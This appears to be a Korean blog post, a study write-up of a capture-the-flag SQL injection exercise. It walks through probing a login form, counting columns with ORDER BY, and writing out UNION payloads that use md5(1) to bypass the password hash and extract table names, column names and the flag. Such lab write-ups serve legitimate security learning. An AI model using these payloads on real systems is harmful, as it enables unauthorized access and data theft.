---
layout: single
title:  "7 주차 SQL injection 데이터 추출 문제 풀이(6)"
categories: SQL-injection
typora-root-url: ..\
author_profile: false

---

<br>

# <span style="background:#000000; color:#ffffff">1. 7 주차 SQL injection 데이터 추출 문제 풀이(6)</span>

<br><span style='font-weight:bold; font-size:15px'> ※ 주의 사항 :</span>   

<span style='font-weight:bold; font-size:15px'>1. 교육 목적으로만 이용 해주세요.</span><br>
<span style='font-weight:bold; font-size:15px'>2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br>
<span style='font-weight:bold; font-size:15px'>3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span>



## <span style="background:#696969; color:#ffffff">1.1   SQL injection</span>

<br>

3번 풀이와 같다

<img src="/images/2024-06-05-SQLinjection23/image-20240605070745758.png" alt="image-20240605070745758" style="zoom:67%;" />



<img src="/images/2024-06-05-SQLinjection23/image-20240605052309872.png" alt="image-20240605052309872" style="zoom:67%;" />

normatitc 아이디로 로그인이 되는 지 확인하였다.  
그리고 user name 에 대한 정보가 추출된다.(DB정보)

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.1 sql injection 포인트 찾기</span>

------

<br>

<img src="/images/2024-06-05-SQLinjection23/image-20240605052418035.png" alt="image-20240605052418035" style="zoom:67%;" />

▶ 해당 로그인 폼에 sql 구문이 적용되는 지 확인하였다.

<img src="/images/2024-06-05-SQLinjection23/image-20240605052546843.png" alt="image-20240605052546843" style="zoom:67%;" />

▶ 식별 /인증 이 동시인가, 분리인가 확인하기 위해 작성했다.   
or 이 로그인이 안되는 것으로 보아 분리일 확률이 높다.

<img src="/images/2024-06-05-SQLinjection23/image-20240605052653941.png" alt="image-20240605052653941" style="zoom:67%;" />

▶ 확실히 하기 위해 비밀 번호가 sql 구문이 적용되는 지 살펴보았다. 로그인이 되지 않으므로   
분리가 확실해 졌다.  왜냐하면 동시라면 둘 다 sql 구문이 적용되어야 하기 때문이다.

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.2 column 개수 찾기</span>

------

<br>

<img src="/images/2024-06-05-SQLinjection23/image-20240605052732705.png" alt="image-20240605052732705" style="zoom:67%;" />

order by 1부터 순차적으로 작성해 본 결과, order by 3 이후로는 로그인이 되지 않는다.   
따라서 칼럼 개수는 2 개라는 사실을 알 수 있다.

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.3 출력되는 column 위치 찾기</span>

------

<br>

<img src="/images/2024-06-05-SQLinjection23/image-20240605052926457.png" alt="image-20240605052926457" style="zoom:67%;" />

<img src="/images/2024-06-05-SQLinjection23/image-20240605052944301.png" alt="image-20240605052944301" style="zoom:67%;" />

로그인을 시도 해본 결과, 로그인이 되지 않는다. 

<img src="/images/2024-06-05-SQLinjection23/image-20240605053007133.png" alt="image-20240605053007133" style="zoom:67%;" />

그렇다는 것은 비밀 번호 값이 다른 것으로 저장 되어 있어서 일치하지 않는다는 사실을 알 수 있다.  
따라서 비밀 번호는 해쉬 처리 해야 한다. 둘 중 어떤 것이 비밀 번호 칼럼 인지 아직 모르므로, 하나 씩 적용해 본다.   
위의 이미지처럼 앞의 칼럼이 비밀 번호이고, 뒤의 칼럼이 아이디 칼럼이다.

그러므로 데이터를 추출 하기 위해서는 아이디 칼럼에 데이터를 추출해야 로그인해서 데이터를 확인할 수 있다.

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.4 DB이름 확인하기</span>

------



<img src="/images/2024-06-05-SQLinjection23/image-20240605053152557.png" alt="image-20240605053152557" style="zoom: 67%;" />

<img src="/images/2024-06-05-SQLinjection23/image-20240605070837777.png" alt="image-20240605070837777" style="zoom:67%;" />

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.5 table이름 확인하기</span>

------

<br>



<img src="/images/2024-06-05-SQLinjection23/image-20240605070911994.png" alt="image-20240605070911994" style="zoom:67%;" />

' union select md5(1),(select table_name from information_schema.tables where table_schema = 'sqli_3' limit 0,1) #

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.6 column 이름 확인하기</span>

------

<br>

<img src="/images/2024-06-05-SQLinjection23/image-20240605070941561.png" alt="image-20240605070941561" style="zoom:67%;" />

' union select md5(1),(select column_name from information_schema.columns where table_name = 'flag_table' limit 0,1) #



<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.7 data 추출하기</span>

------



<img src="/images/2024-06-05-SQLinjection23/image-20240605071110597.png" alt="image-20240605071110597" style="zoom:67%;" />

' union select md5(1),(select flag from flag_table limit 0,1) #





